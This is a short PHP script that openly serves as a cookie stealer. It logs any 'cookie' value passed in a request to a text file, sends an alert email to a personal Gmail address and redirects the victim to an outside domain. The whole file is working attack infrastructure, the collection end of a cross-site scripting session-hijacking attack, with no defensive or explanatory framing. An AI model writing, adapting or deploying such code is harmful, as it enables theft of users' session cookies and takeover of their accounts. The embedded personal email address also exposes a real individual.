<?php

if (isset($_REQUEST["cookie"])) {
  $fp = fopen("cookies.txt", "a+");
  fwrite($fp, $_REQUEST["cookie"] . "\n");
  fclose($fp);
  mail("mivolakis@gmail.com", "COOKIE STEALER NEEDS ACTION", "RED ALERT: COOKIE STEALER DETECTED A COOKIE.\n RUN!!");
}

header("Location: http://kerberosclan.puppies.chatzi.org");
